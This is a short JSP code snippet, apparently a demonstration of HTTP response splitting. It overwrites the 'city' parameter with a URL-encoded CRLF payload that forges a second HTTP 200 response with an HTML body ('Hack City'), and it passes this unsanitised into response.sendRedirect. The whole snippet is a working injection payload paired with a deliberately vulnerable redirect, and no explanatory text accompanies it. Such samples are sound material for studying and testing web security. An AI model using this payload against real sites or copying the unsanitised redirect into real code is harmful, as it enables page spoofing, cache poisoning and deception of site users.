<%
	String city = request.getParameter("city");
city = "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:2019%0d%0a%0d%0a<html>Hack City</html>";
response.sendRedirect("show_bycity.jsp?city=" +city);
%>